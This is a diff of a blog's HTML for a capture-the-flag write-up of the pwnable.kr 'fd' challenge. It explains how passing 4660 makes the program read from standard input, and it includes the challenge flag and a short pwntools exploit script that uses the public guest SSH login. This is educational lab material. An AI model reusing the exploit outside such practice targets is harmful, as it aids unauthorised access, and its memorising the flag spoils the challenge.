@@ -87,8 +87,7 @@
 -<a href="https://en.wikipedia.org/wiki/Pwn" target="_blank" rel="noopener noreferrer">Wikipedia</a></p>
 </blockquote>
 
-<p><br>
-<img src="/images/pwn/fd/0.png" alt=""></p>
+<p><br><img src="/images/pwn/fd/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="challenge-description">Challenge Description</h2>
@@ -110,68 +109,66 @@ ssh fd@pwnable.kr -p2222 (pw:guest)
 
 <h2 id="source-analysis">Source analysis</h2>
 <p><br> After we <code class="highlighter-rouge">ssh</code> to the server (<code class="highlighter-rouge">ssh fd@pwnable.kr -p2222</code> , password : <code class="highlighter-rouge">guest</code>) we find 3 files 
-<img src="/images/pwn/fd/1.png" alt="">
+<br><img src="/images/pwn/fd/1.png" alt=""><br>
 <br> <code class="highlighter-rouge">fd</code> , <code class="highlighter-rouge">fd.c</code> and <code class="highlighter-rouge">flag</code>.
 <br> <code class="highlighter-rouge">fd</code> is an executable , and <code class="highlighter-rouge">fd.c</code> is the source of that executable
-<img src="/images/pwn/fd/2.png" alt="">
+<br><img src="/images/pwn/fd/2.png" alt=""><br>
 <br> And we don’t have permissions to view <code class="highlighter-rouge">flag</code> :
-<img src="/images/pwn/fd/3.png" alt="">
+<br><img src="/images/pwn/fd/3.png" alt=""><br>
 <br> Let’s take a look at the source :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
-char buf[32];
-int main(int argc, char* argv[], char* envp[]){
-        if(argc&lt;2){
-                printf("pass argv[1] a number\n");
-                return 0;
-        }
-        int fd = atoi( argv[1] ) - 0x1234;
-        int len = 0;
-        len = read(fd, buf, 32);
-        if(!strcmp("LETMEWIN\n", buf)){
-                printf("good job :)\n");
-                system("/bin/cat flag");
-                exit(0);
-        }
-        printf("learn about Linux file IO\n");
-        return 0;
+</span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"pass argv[1] a number</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
+        <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"LETMEWIN</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"good job :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"learn about Linux file IO</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
-}
+<span class="p">}</span>
 </code></pre></div></div>
 <h2 id="breakdown-">Breakdown :</h2>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char buf[32];
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
 </code></pre></div></div>
 <p><br> This assigns a buffer of 32 chars to the variable <code class="highlighter-rouge">buf</code>
 <br></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(argc&lt;2){
-                printf("pass argv[1] a number\n");
-                return 0;
-        }
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"pass argv[1] a number</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
 
 </code></pre></div></div>
 <p><br> Here it starts by checking if we passed and argument or not , and if we didn’t , it will print <code class="highlighter-rouge">pass argv[1] a number</code>
-<img src="/images/pwn/fd/4.png" alt="">
-<br>
-<br></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int fd = atoi( argv[1] ) - 0x1234;
+<br><img src="/images/pwn/fd/4.png" alt=""></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="o">-</span> <span class="mh">0x1234</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br> Then it defines a variable called <code class="highlighter-rouge">fd</code> , the value of that variable is <code class="highlighter-rouge">atoi( argv[1] ) - 0x1234</code>. <code class="highlighter-rouge">atoi()</code> is a function in <code class="highlighter-rouge">c</code> that converts a string into an integer , it stands for <code class="highlighter-rouge">Ascii to Integer</code> , <code class="highlighter-rouge">0x1234</code> is the hex of <code class="highlighter-rouge">4660</code> 
-<img src="/images/pwn/fd/5.png" alt="">
+<br><img src="/images/pwn/fd/5.png" alt=""><br>
 <br> So it subtracts 4660 from our input.
 <br></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int len = 0;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br> This defines a variable called <code class="highlighter-rouge">len</code> and assigns a value of <code class="highlighter-rouge">0</code> to it
 <br></p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        len = read(fd, buf, 32);
-        if(!strcmp("LETMEWIN\n", buf)){
-                printf("good job :)\n");
-                system("/bin/cat flag");
-                exit(0);
-        }
-        printf("learn about Linux file IO\n");
-        return 0;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="s">"LETMEWIN</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">)){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">"good job :)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+                <span class="n">system</span><span class="p">(</span><span class="s">"/bin/cat flag"</span><span class="p">);</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"learn about Linux file IO</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 
 </code></pre></div></div>
 <p><br> Here it’s taking <code class="highlighter-rouge">fd</code> and also reading our input and puts it into <code class="highlighter-rouge">buf</code> , then there’s an if statement which checks if the value of buf is <code class="highlighter-rouge">LETMEIN</code> , if it’s then it will print <code class="highlighter-rouge">good job</code> and give us the flag , but if it’s not it will print <code class="highlighter-rouge">learn about Linux file IO</code>. 
@@ -181,13 +178,13 @@ int main(int argc, char* argv[], char* envp[]){
 <h2 id="exploitation">Exploitation</h2>
 <p><br> Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic.
 <br> Let’s run the program just to test :
-<code class="highlighter-rouge">./fd 1337</code>
-<img src="/images/pwn/fd/6.png" alt="">
+<br><code class="highlighter-rouge">./fd 1337</code>
+<br><img src="/images/pwn/fd/6.png" alt=""><br>
 <br> It prints <code class="highlighter-rouge">learn about Linux file IO</code> , because we didn’t get <code class="highlighter-rouge">fd</code> right. We know that <code class="highlighter-rouge">fd</code> is an abbreviation for file descriptor , and there are 3 file descriptors <code class="highlighter-rouge">stdin</code> <code class="highlighter-rouge">stdout</code> <code class="highlighter-rouge">stderr</code> , And we can also control the value of <code class="highlighter-rouge">fd</code> because we know that it’s subtracting 4660 from <code class="highlighter-rouge">argv[1]</code> and we control <code class="highlighter-rouge">argv[1]</code> , how are we giving the program <code class="highlighter-rouge">argv[1]</code> ? Through <code class="highlighter-rouge">stdin</code> which is represented by <code class="highlighter-rouge">0</code> , so if we gave the program <code class="highlighter-rouge">4660</code> , <code class="highlighter-rouge">fd = 4660 - 4660</code> , <code class="highlighter-rouge">fd = 0</code>. Let’s try it.
-<img src="/images/pwn/fd/7.png" alt="">
+<br><img src="/images/pwn/fd/7.png" alt=""><br>
 <br> Now it didn’t print <code class="highlighter-rouge">learn about Linux file IO</code> , instead of that it’s reading our input –&gt; <code class="highlighter-rouge">len = read(fd, buf, 32);</code>
 <br> We knew earlier that we have to make buf = “LETMEWIN” to execute the first <code class="highlighter-rouge">if</code> condition :
-<img src="/images/pwn/fd/8.png" alt="">
+<br><img src="/images/pwn/fd/8.png" alt=""><br>
 <br> And we got the flag : “mommy! I think I know what a file descriptor is!!”
 <br></p>
 <hr>
@@ -195,20 +192,18 @@ int main(int argc, char* argv[], char* envp[]){
 <h2 id="exploitation-with-python-pwntools">Exploitation with python pwntools</h2>
 <p><br> We will use a python library called pwntools to create an exploit. Read the documentation <a href="http://docs.pwntools.com/en/stable/about.html" target="_blank" rel="noopener noreferrer">here</a>
 <br> We will import the pwntools library :
-<code class="highlighter-rouge">from pwn import *</code>
+<br><code class="highlighter-rouge">from pwn import *</code>
 <br> Then we will set up an <code class="highlighter-rouge">ssh</code> connection to the server :
-<code class="highlighter-rouge">shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)</code>
+<br><code class="highlighter-rouge">shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)</code>
 <br> <code class="highlighter-rouge">fd</code> is the username , <code class="highlighter-rouge">pwnable.kr</code> is the host
 <br> After that we will start a process to execute <code class="highlighter-rouge">./fd 4660</code>
-<code class="highlighter-rouge">process = shell.process(executable='./fd', argv=['fd','4660'])</code>
+<br><code class="highlighter-rouge">process = shell.process(executable='./fd', argv=['fd','4660'])</code>
 <br> And finally we will send <code class="highlighter-rouge">LETMEWIN</code> and read the output
-<code class="highlighter-rouge">process.sendline('LETMEWIN')</code>
-<br>
-<br>
-<code class="highlighter-rouge">print process.recv()</code>
+<br><code class="highlighter-rouge">process.sendline('LETMEWIN')</code>
+<br><code class="highlighter-rouge">print process.recv()</code>
 <br></p>
 <h2 id="final-script-">Final script :</h2>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -217,10 +212,9 @@ int main(int argc, char* argv[], char* envp[]){
 <span class="n">process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'LETMEWIN'</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">process</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 </code></pre></div></div>
-<p><img src="/images/pwn/fd/9.png" alt="">
-<br> Let’s try it :
-<code class="highlighter-rouge">./exploit.py</code>
-<img src="/images/pwn/fd/10.png" alt="">
+<p><br> Let’s try it :
+<br><code class="highlighter-rouge">./exploit.py</code>
+<br><img src="/images/pwn/fd/10.png" alt=""><br>
 <br> And it’s working !
 <br> That’s it , Feedback is appreciated !
 <br> Don’t forget to read the <a href="/categories">other write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
